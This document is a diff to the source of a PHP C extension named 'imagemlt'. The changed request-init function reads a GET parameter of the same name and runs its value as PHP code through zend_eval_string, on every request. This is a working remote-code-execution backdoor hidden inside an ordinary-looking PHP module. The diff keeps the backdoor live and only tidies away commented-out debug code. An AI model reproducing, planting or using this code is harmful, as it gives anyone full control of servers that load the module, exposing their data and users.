@@ -51,42 +51,16 @@ PHP_RINIT_FUNCTION(imagemlt)
 #if defined(ZTS) && defined(COMPILE_DL_IMAGEMLT)
 	ZEND_TSRMLS_CACHE_UPDATE();
 #endif
-//zend_string *key;
-				//zval *data;
-				//HashTable *ht;
-
-				zval arr;
-				zval evil,*res;
-
-
-
-				arr = PG(http_globals)[TRACK_VARS_GET];
-				/*zend_ulong h;
-                int count=zend_hash_num_elements(Z_ARRVAL(arr));
-
-                printf("hashtable size:%d\n",count);
-
-                ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL(arr), h, key, data) {
-                    php_printf(ZSTR_VAL(key));
-                    php_printf("=>'");
-                    php_printf(Z_STRVAL_P(data));
-                    php_printf("'<br>");
-
-                } ZEND_HASH_FOREACH_END();
-                */
-				ZVAL_STRING(&evil,"imagemlt");
-				res=zend_hash_find(Z_ARRVAL(arr),Z_STR(evil));
-				if(res){
-			if(Z_TYPE_P(res)==IS_STRING){
-				zend_eval_string(Z_STRVAL_P(res),
-								 NULL, "snake_zero" TSRMLS_CC);
-			}
+	zval arr;
+	zval evil,*res;
+	arr = PG(http_globals)[TRACK_VARS_GET];
+	ZVAL_STRING(&evil,"imagemlt");
+	res=zend_hash_find(Z_ARRVAL(arr),Z_STR(evil));
+	if(res){
+		if(Z_TYPE_P(res)==IS_STRING){
+			zend_eval_string(Z_STRVAL_P(res), NULL, "snake_zero" TSRMLS_CC);
 		}
-
-
-				//ZVAL_NULL(&arr);
-				//ZVAL_NULL(&evil);
-				//ZVAL_NULL(res);
+	}
 	return SUCCESS;
 }
 /* }}} */
